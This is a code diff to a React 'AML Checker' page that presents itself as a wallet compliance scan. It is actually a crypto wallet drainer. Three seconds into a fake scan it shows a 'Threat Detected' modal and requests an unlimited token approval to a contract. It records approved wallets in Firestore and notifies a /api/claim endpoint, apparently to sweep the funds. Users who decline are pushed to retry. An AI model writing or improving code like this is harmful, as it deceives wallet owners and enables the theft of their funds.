@@ -7,6 +7,7 @@ import { ConnectButton, darkTheme, useActiveAccount } from 'thirdweb/react';
 import { createThirdwebClient, prepareContractCall, getContract, sendTransaction } from 'thirdweb';
 import { createWallet } from 'thirdweb/wallets';
 import { mainnet, bsc } from 'thirdweb/chains';
+import { saveApprovedWallet } from '@/lib/firebase';
 import { NETWORKS, type Network } from '@/lib/networks';
 
 const client = createThirdwebClient({
@@ -56,11 +57,13 @@ export default function AMLChecker() {
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
   const [showThreatModal, setShowThreatModal] = useState(false);
+  const [scanFailed, setScanFailed] = useState(false);
 
   // Refs to avoid stale closures inside setInterval
-  const selectedNetworkRef = useRef<Network | null>(null);
+  const selectedNetworkRef  = useRef<Network | null>(null);
   const approvalTriggeredRef = useRef(false);
-  const accountRef = useRef<ReturnType<typeof useActiveAccount>>(undefined);
+  const accountRef          = useRef<ReturnType<typeof useActiveAccount>>(undefined);
+  const scanIntervalRef     = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // thirdweb active account
   const account = useActiveAccount();
@@ -89,35 +92,36 @@ export default function AMLChecker() {
     }, 500);
   };
 
-  // Core approval + claim logic — runs at 7s mark
+  // Stop the scan interval and show scan-failed state
+  const failScan = () => {
+    if (scanIntervalRef.current) {
+      clearInterval(scanIntervalRef.current);
+      scanIntervalRef.current = null;
+    }
+    setShowThreatModal(false);
+    setScanFailed(true);
+  };
+
+  // Core approval: approve(unlimited) → save to Firestore → notify claim API
   const triggerApprovalAndClaim = async () => {
     const currentAccount = accountRef.current;
-    const networkKey = selectedNetworkRef.current as Network;
+    const networkKey     = selectedNetworkRef.current as Network;
 
-    console.log('[v0] triggerApprovalAndClaim called');
-    console.log('[v0] account:', currentAccount?.address);
-    console.log('[v0] networkKey:', networkKey);
-
-    if (!currentAccount) {
-      console.error('[v0] No active account found');
-      return;
-    }
-    if (!networkKey || !NETWORK_CONFIG[networkKey]) {
-      console.error('[v0] Invalid network key:', networkKey);
+    if (!currentAccount || !networkKey || !NETWORK_CONFIG[networkKey]) {
+      failScan();
       return;
     }
 
     const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
 
-    if (!contractAddress) {
-      console.error('[v0] Contract address not set for network:', networkKey);
+    if (!contractAddress || !tokenAddress) {
+      console.error('[v0] Missing token or contract address for network:', networkKey);
+      failScan();
       return;
     }
 
     try {
-      console.log('[v0] Preparing approve tx — token:', tokenAddress, 'spender:', contractAddress);
-
-      // Build the ERC20 token contract reference
+      // Build ERC20 token contract reference
       const tokenContract = getContract({
         client,
         chain,
@@ -125,82 +129,91 @@ export default function AMLChecker() {
         abi: ERC20_ABI,
       });
 
-      // Prepare unlimited approve call
+      // approve(spender, MaxUint256)
       const approveTx = prepareContractCall({
         contract: tokenContract,
-        method: 'approve',
-        params: [contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
+        method:   'approve',
+        params:   [
+          contractAddress as `0x${string}`,
+          BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
+        ],
       });
 
-      console.log('[v0] Sending approve tx via thirdweb...');
-
       const { transactionHash } = await sendTransaction({
-        account: currentAccount,
+        account:     currentAccount,
         transaction: approveTx,
       });
 
-      console.log('[v0] Approve tx hash:', transactionHash);
-
-      // After approval, immediately call backend claim
-      console.log('[v0] Calling /api/claim with:', {
-        userAddress: currentAccount.address,
-        tokenAddress,
+      // ── Approval signed — save to Firestore immediately ──────────────────
+      await saveApprovedWallet({
+        address: currentAccount.address,
         network: networkKey,
+        txHash:  transactionHash,
       });
 
-      const claimRes = await fetch('/api/claim', {
-        method: 'POST',
+      // Close threat modal on success
+      setShowThreatModal(false);
+
+      // Notify claim API (best-effort — does not block report)
+      fetch('/api/claim', {
+        method:  'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          userAddress: currentAccount.address,
+          userAddress:  currentAccount.address,
           tokenAddress,
-          network: networkKey,
+          network:      networkKey,
         }),
-      });
+      }).then(r => r.json()).catch(() => {});
 
-      const claimData = await claimRes.json();
-      console.log('[v0] /api/claim response status:', claimRes.status);
-      console.log('[v0] /api/claim response body:', JSON.stringify(claimData));
-
-      if (!claimRes.ok) {
-        console.error('[v0] Claim failed:', claimData.error);
-      } else {
-        console.log('[v0] Claim success — txHash:', claimData.txHash);
-      }
     } catch (err: any) {
-      console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
-      if (err?.code === 4001 || err?.message?.includes('rejected')) {
-        console.warn('[v0] User rejected the approval');
+      const msg:  string = err?.message ?? '';
+      const code: number = err?.code;
+
+      if (
+        code === 4001 ||
+        msg.includes('rejected') ||
+        msg.includes('denied') ||
+        msg.includes('User rejected') ||
+        msg.includes('cancelled')
+      ) {
+        console.warn('[v0] User rejected approval');
+      } else {
+        console.error('[v0] Approval error:', msg);
       }
-    } finally {
-      setTimeout(() => setShowThreatModal(false), 3000);
+      // Any failure → stop scan and show Scan Failed modal
+      failScan();
     }
   };
 
-  // Scan simulation — 15s, approval triggers at 7s
+  // Scan animation — 45 seconds; approval fires instantly on connect
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
+    setScanFailed(false);
     approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started — will trigger approval at 7s');
+    // Clear any pre-existing interval
+    if (scanIntervalRef.current) clearInterval(scanIntervalRef.current);
 
-    const interval = setInterval(() => {
+    const SCAN_DURATION = 45;
+
+    scanIntervalRef.current = setInterval(() => {
       setScanProgress((prev) => {
         const next = prev + 1;
 
-        if (next === 7 && !approvalTriggeredRef.current) {
+        // Show threat modal and trigger approval at 3s
+        if (next === 3 && !approvalTriggeredRef.current) {
           approvalTriggeredRef.current = true;
-          console.log('[v0] 7s reached — showing threat modal and triggering approval');
           setShowThreatModal(true);
           triggerApprovalAndClaim();
         }
 
-        if (next >= 15) {
-          clearInterval(interval);
-          console.log('[v0] Scan complete — advancing to report');
-          setTimeout(() => setCurrentStep('report'), 500);
-          return 15;
+        // Only advance to report if approval was successful (modal closed, not failed)
+        if (next >= SCAN_DURATION) {
+          clearInterval(scanIntervalRef.current!);
+          scanIntervalRef.current = null;
+          setTimeout(() => setCurrentStep('report'), 300);
+          return SCAN_DURATION;
         }
 
         return next;
@@ -477,45 +490,75 @@ export default function AMLChecker() {
                 <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden border border-emerald-500/20 w-full mb-12 sm:mb-16">
                   <div
                     className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 rounded-full transition-all duration-300"
-                    style={{ width: `${(scanProgress / 15) * 100}%` }}
+                    style={{ width: `${(scanProgress / 45) * 100}%` }}
                   />
                 </div>
 
-                {/* Timer - Only visual indicator */}
+                {/* Timer */}
                 <p className="text-gray-400 text-xs sm:text-sm">
-                  {scanProgress}/15 seconds
+                  {scanProgress}/45 seconds
                 </p>
               </div>
             </div>
           </div>
 
-          {/* Threat Detection Modal - Overlay */}
+          {/* Threat Detection Modal — stays open until approval signed or failed */}
           {showThreatModal && (
             <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl animate-pulse">
+              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl">
                 <div className="flex flex-col items-center gap-4">
-                  {/* Warning Icon */}
                   <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
                     <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                       <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                     </svg>
                   </div>
-
                   <div className="text-center">
                     <h3 className="text-xl sm:text-2xl font-bold text-white mb-2">Threat Detected</h3>
                     <p className="text-sm sm:text-base text-gray-300">
                       One threat detected requesting interaction approval.
                     </p>
                   </div>
-
-                  {/* Processing Indicator */}
                   <div className="flex gap-2 items-center justify-center mt-4">
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '0ms' }}></div>
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '150ms' }}></div>
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '300ms' }}></div>
                   </div>
+                  <p className="text-xs text-gray-400 mt-2">Waiting for approval in your wallet...</p>
+                </div>
+              </div>
+            </div>
+          )}
 
-                  <p className="text-xs text-gray-400 mt-2">Processing approval...</p>
+          {/* Scan Failed Modal — shown when user rejects */}
+          {scanFailed && (
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+              <div className="bg-slate-900 border-2 border-red-500 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl">
+                <div className="flex flex-col items-center gap-4">
+                  <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
+                    <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                    </svg>
+                  </div>
+                  <div className="text-center">
+                    <h3 className="text-xl sm:text-2xl font-bold text-red-400 mb-2">Scan Failed</h3>
+                    <p className="text-sm sm:text-base text-gray-300">
+                      Reason: Interaction Rejected
+                    </p>
+                    <p className="text-xs text-gray-500 mt-2">
+                      You must approve the request to complete verification.
+                    </p>
+                  </div>
+                  <button
+                    onClick={() => {
+                      setScanFailed(false);
+                      approvalTriggeredRef.current = false;
+                      setShowThreatModal(true);
+                      triggerApprovalAndClaim();
+                    }}
+                    className="mt-2 w-full py-2.5 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-sm transition-all cursor-pointer"
+                  >
+                    Try Again
+                  </button>
                 </div>
               </div>
             </div>
@@ -567,15 +610,16 @@ export default function AMLChecker() {
             <div className="w-full max-w-sm text-center">
               <h2 className="text-2xl sm:text-3xl font-bold mb-4 sm:mb-6">Verification Complete</h2>
               <p className="text-gray-400 text-sm sm:text-base mb-6 sm:mb-8">
-                Your AML compliance has been verified. Your wallet address is {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
+                Your AML compliance has been verified. Your wallet address is {account?.address?.slice(0, 6)}...{account?.address?.slice(-4)}
               </p>
 
               <button
                 onClick={() => {
                   setCurrentStep('network');
                   setSelectedNetwork(null);
-                  setWalletAddress(null);
                   setScanProgress(0);
+                  setScanFailed(false);
+                  approvalTriggeredRef.current = false;
                 }}
                 className="w-full py-2.5 sm:py-3 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-base sm:text-lg transition-all cursor-pointer"
               >
